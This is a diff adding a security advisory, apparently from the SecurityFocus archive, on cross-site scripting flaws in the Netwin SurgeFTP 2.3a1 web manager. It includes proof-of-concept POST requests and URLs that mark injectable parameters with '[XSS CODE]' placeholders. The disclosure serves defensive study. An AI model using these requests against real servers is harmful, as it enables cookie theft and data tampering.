@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/21534/info
+
+Netwin SurgeFTP is prone to multiple input-validation vulnerabilities because it fails to sanitize user-supplied input.
+
+A successful exploit of these vulnerabilities could allow an attacker to compromise the application, access or modify data, and steal cookie-based authentication credentials. Other attacks are also possible.
+
+Version 2.3a1 is vulnerable to these issues; others versions may also be affected.
+
+POST /cgi/surgeftpmgr.cgi? HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 127 &info=&choose_domain=d-46544a&username=[XSS CODE]&password=&usergroups=&cmd_user_lookup.x=30&cmd_user_lookup.y=13 POST /cgi/surgeftpmgr.cgi? HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 127 cmd=help&searchfor=[XSS codehere]&cmd_search_help=search+help&cmd_search_help.x=50&cmd_search_help.y=11 http://www.example.com/surgeftpmgr.cgi&email=[XSS CODE HERE]&frequency=Day&when_hr=00&when_min=00&domain=d- http://www.example.com/surgeftpmgr.cgi&email=&frequency=Day&when_hr=00&when_min=00&domain=d-46544a&filter=[XSSCODE Here]
